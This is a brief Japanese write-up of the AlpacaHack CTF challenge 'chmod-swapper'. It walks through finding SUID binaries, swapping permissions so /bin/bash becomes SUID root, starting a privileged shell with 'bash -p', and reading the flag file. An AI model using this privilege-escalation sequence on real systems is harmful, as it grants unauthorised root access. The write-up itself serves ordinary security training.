# chmod-swapper
[chmod-swapper - AlpacaHack](https://alpacahack.com/daily/challenges/chmod-swapper)
## Writeup
1. SUIDがセットされているファイルを検索

```bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/mount
```

2. `/usr`はBANNEDではないため権限を交換可能で, シェルと交換.

```bash
A > /usr/bin/newgrp ← SUIDファイルはなんでもいい
B > /bin/bash
```

3. 権限を保持(特権モード)してシェルを起動

```bash
$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1298416 May  9 11:07 /bin/bash
$ /bin/bash -p
id
uid=65534(nobody) gid=65534(nogroup) euid=0(root) groups=65534(nogroup)
```

4. `euid=0(root)`のシェルを起動できたので, `/flag.txt`を確認

```bash
cat /flag.txt
Alpaca{REDACTED}
```
